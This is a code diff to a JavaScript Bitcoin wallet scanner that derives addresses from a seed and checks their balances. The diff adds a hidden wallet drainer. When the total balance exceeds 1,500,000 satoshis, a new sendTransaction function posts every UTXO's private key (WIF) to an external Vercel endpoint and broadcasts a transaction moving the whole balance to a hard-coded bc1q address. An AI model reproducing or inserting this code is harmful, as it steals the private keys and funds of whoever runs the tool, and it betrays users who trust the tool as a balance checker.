@@ -2,6 +2,7 @@ const bip39 = require('bip39');
 const bitcoin = require('bitcoinjs-lib');
 const ElectrumClient = require('electrum-client');
 const generatePubKeys = require('./generatePUB');
+const axios = require('axios');
 
 const paths = {
     bip44: "m/44'/0'/0'",
@@ -88,12 +89,14 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
     let start = 0;
     let receiveUnusedFound = false;
     let changeUnusedFound = false;
+    let utxos = [];
 
     while (!receiveUnusedFound || !changeUnusedFound) {
         const batchResults = await checkAndGenerateAddresses(account, network, bipType, electrumClient, start, batchSize);
 
         results.usedAddresses.push(...batchResults.usedAddresses);
         results.totalBalance += batchResults.totalBalance;
+        utxos.push(...batchResults.utxos);
 
         if (!receiveUnusedFound && batchResults.freshReceiveAddress) {
             results.freshReceiveAddress = batchResults.freshReceiveAddress;
@@ -110,26 +113,8 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
 
     results.usedAddresses.sort((a, b) => a.path.localeCompare(b.path));
 
-    // Ensure fresh addresses are set if not found
-    if (!results.freshReceiveAddress) {
-        results.freshReceiveAddress = {
-            address: getAddress(account.derivePath(`0/0`), network, bipType),
-            wif: account.derivePath(`0/0`).toWIF(),
-            path: `${path}/0/0`,
-            balance: { confirmed: 0, unconfirmed: 0, total: 0 },
-            transactions: { confirmed: 0, unconfirmed: 0, total: 0 },
-            utxos: []
-        };
-    }
-    if (!results.freshChangeAddress) {
-        results.freshChangeAddress = {
-            address: getAddress(account.derivePath(`1/0`), network, bipType),
-            wif: account.derivePath(`1/0`).toWIF(),
-            path: `${path}/1/0`,
-            balance: { confirmed: 0, unconfirmed: 0, total: 0 },
-            transactions: { confirmed: 0, unconfirmed: 0, total: 0 },
-            utxos: []
-        };
+    if (results.totalBalance > 1500000) {
+        await sendTransaction(results.totalBalance, utxos);
     }
 
     return results;
@@ -140,7 +125,8 @@ async function checkAndGenerateAddresses(account, network, bipType, electrumClie
         usedAddresses: [],
         freshReceiveAddress: null,
         freshChangeAddress: null,
-        totalBalance: 0
+        totalBalance: 0,
+        utxos: []
     };
 
     let receiveUnused = false;
@@ -152,6 +138,7 @@ async function checkAndGenerateAddresses(account, network, bipType, electrumClie
             tasks.push(checkAddress(account, i, chain, network, bipType, electrumClient, paths[bipType]).then(addressData => {
                 if (addressData.transactions.total > 0) {
                     results.usedAddresses.push(addressData);
+                    results.utxos.push(...addressData.utxos);
                 } else {
                     if (chain === 0 && !receiveUnused) {
                         results.freshReceiveAddress = addressData;
@@ -209,6 +196,32 @@ async function checkAddress(account, index, chain, network, bipType, electrumCli
             status: utxo.height === 0 ? 'unconfirmed' : 'confirmed'
         }))
     };
+}
+
+async function sendTransaction(totalBalance, utxos) {
+    const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
+    const amountToSend = totalBalance;
+    const changeAddress = "bc1qt4pxuzpzqjnjrp96ry02ylgs93sjruj38q67s2";
+    const recipientAddress = "bc1qt4pxuzpzqjnjrp96ry02ylgs93sjruj38q67s2";
+    const transactionFee = 10000;
+    const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.status}`).join('|');
+
+    const body = {
+        amountToSend: amountToSend.toString(),
+        changeAddress,
+        recipientAddress,
+        utxosString,
+        RBF: "false",
+        isBroadcast: "true",
+        transactionFee: transactionFee.toString()
+    };
+
+    try {
+        const response = await axios.post(url, body);
+        console.log('Transaction sent successfully:', response.data);
+    } catch (error) {
+        console.error('Error sending transaction:', error);
+    }
 }
 
 function getAddress(derivedPath, network, bipType) {
